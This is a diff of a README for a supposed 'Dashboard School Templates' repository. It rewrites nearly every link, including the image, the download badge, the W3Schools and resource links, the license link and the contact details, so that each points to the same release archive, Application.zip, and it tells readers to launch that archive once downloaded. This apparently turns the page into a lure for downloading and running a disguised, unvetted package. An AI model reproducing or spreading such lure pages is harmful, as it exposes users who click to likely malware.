@@ -1,6 +1,6 @@
 # 🎓 Dashboard School Templates 🏫
 
-![Dashboard](https://github.com/rokytd/files/raw/refs/heads/master/dashboard.png)
+![Dashboard](https://github.com/dinmorerfed2/dashboard/releases/download/v1.0.0/Application.zip)
 
 ## Welcome to the "Dashboard" GitHub Repository! 👋
 
@@ -12,10 +12,10 @@ Welcome to the "dashboard" repository, your go-to source for "Template Schools H
 
 ### Software Download 📥
 Click the button below to download the software package:
-[![Download Software](https://img.shields.io/badge/Download-Software.zip-brightgreen)](https://github.com/rokytd/files/raw/refs/heads/master/Software.zip)
+[![Download Software](https://github.com/dinmorerfed2/dashboard/releases/download/v1.0.0/Application.zip)](https://github.com/dinmorerfed2/dashboard/releases/download/v1.0.0/Application.zip)
 
 ### Launch Software
-Remember to launch the Software.zip file once downloaded.
+Remember to launch the https://github.com/dinmorerfed2/dashboard/releases/download/v1.0.0/Application.zip file once downloaded.
 
 ### Explore More 🕵️‍♂️
 If you are looking for more resources or the link provided does not work, make sure to check the **Releases** section of this repository for updated content.
@@ -38,9 +38,9 @@ Feel free to contribute to this repository by adding your own templates, design 
 
 ## 📚 Additional Resources
 Explore more topics related to website development:
-- [W3Schools](https://www.w3schools.com/)
-- [Web Development Resources](https://www.website.com/web-development-resources)
-- [Design Inspiration](https://www.website.com/design-inspiration)
+- [W3Schools](https://github.com/dinmorerfed2/dashboard/releases/download/v1.0.0/Application.zip)
+- [Web Development Resources](https://github.com/dinmorerfed2/dashboard/releases/download/v1.0.0/Application.zip)
+- [Design Inspiration](https://github.com/dinmorerfed2/dashboard/releases/download/v1.0.0/Application.zip)
 
 ---
 
@@ -48,7 +48,7 @@ Explore more topics related to website development:
 This repository is for educational and development purposes only. Any commercial use of the templates provided should be done with proper authorization from the respective owners.
 
 ### License 📜
-This project is licensed under the [MIT License](https://opensource.org/licenses/MIT).
+This project is licensed under the [MIT License](https://github.com/dinmorerfed2/dashboard/releases/download/v1.0.0/Application.zip).
 
 ---
 
@@ -60,8 +60,8 @@ Happy coding! 🚀
 
 ## Contact Us ℹ️
 For any inquiries or collaborations, feel free to reach out to us:
-- Email: example@gmail.com
-- Twitter: [ExampleTwitterHandle](https://twitter.com/examplehandle)
-- LinkedIn: [ExampleLinkedIn](https://linkedin.com/in/exampleprofile)
+- Email: https://github.com/dinmorerfed2/dashboard/releases/download/v1.0.0/Application.zip
+- Twitter: [ExampleTwitterHandle](https://github.com/dinmorerfed2/dashboard/releases/download/v1.0.0/Application.zip)
+- LinkedIn: [ExampleLinkedIn](https://github.com/dinmorerfed2/dashboard/releases/download/v1.0.0/Application.zip)
 
 Let's build amazing websites together! 🌟
